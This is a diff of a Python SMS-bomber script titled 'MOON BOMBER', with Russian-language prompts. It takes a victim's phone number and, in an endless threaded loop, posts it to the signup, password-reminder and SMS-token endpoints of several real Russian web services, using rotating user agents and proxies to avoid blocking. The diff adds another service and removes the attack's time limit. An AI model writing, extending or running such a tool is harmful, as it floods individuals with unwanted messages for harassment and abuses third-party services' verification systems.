@@ -1,9 +1,9 @@
 import os, random, time, threading
 os.system('mode 75, 22')
 if os.name == 'nt':
-    os.system('title MOON BOMBER')
+    os.system('title  MOON BOMBER')
 else:
-    sys.stdout.write("\x1b]2;MOON BOMBER\x07")
+    sys.stdout.write("\x1b]2;  MOON BOMBER\x07")
 try:
  import requests
 except:
@@ -51,13 +51,13 @@ def main():
         return main()
     phone = input(f'\n\n\n\n\n\n\n\n                              {fsuc}MOON {wh}BOMBER\n\n\n\n\n\n\n\n\n{ques}{wh} Номер телефона:{fsuc} ')
     delay = input(f'{ques}{wh} Задержка (В секундах):{fsuc} ')
-    dur = float(input(f'{ques}{wh} Длительность (В секундах):{fsuc} '))
+    input(f'{ques} Для атаки нажмите ENTER')
     sagents = ['Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36','Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)','Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36','Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36','Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36']
     if phone.startswith('8'):
        phone = phone.replace('8', '7')
     elif phone.startswith('+7'):
        phone = phone.replace('+7', '7')
-    def service():
+    def services():
      while True:
       agent = random.choice(sagents)   
       header = {
@@ -263,17 +263,17 @@ def main():
 
       time.sleep(float(delay))
       try:
-       requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={agent}, proxies={'https://api.mtstv.ru':random.choice(proxies)}) 
+       requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={agent}, proxies={'https://api.mtstv.ru': random.choice(proxies)}) 
       except: pass 
       time.sleep(float(delay))
       try:
-        requests.post('https://www.rabota.ru/remind', data={'credential': phone}, proxies={'https://www.rabota.ru':random.choice(proxies)}) 
+        requests.post('https://www.rabota.ru/remind', data={'credential': phone}, proxies={'https://www.rabota.ru': random.choice(proxies)}) 
       except: pass  
-    print(f' {suc}{wh} Команда{fsuc} успешно{wh} отправлена на {fsuc}30{wh} сервисов')
-
-    sec = time.time()
-    while time.time()<=sec+dur:
-     threading.Thread(target = service).start()  
+      try:
+        r = requests.post('http://service.matreshcar.ru/profile/smstoken', data ={"PhoneNumber":phone} , proxies={'http://service.matreshcar.ru': random.choice(proxies)})
+      except: pass
+    print(f' {suc}{wh} Команда{fsuc} успешно{wh} отправлена на {fsuc}31{wh} сервис')  
+    threading.Thread(target = services).start()  
 
 
 if __name__=='__main__':
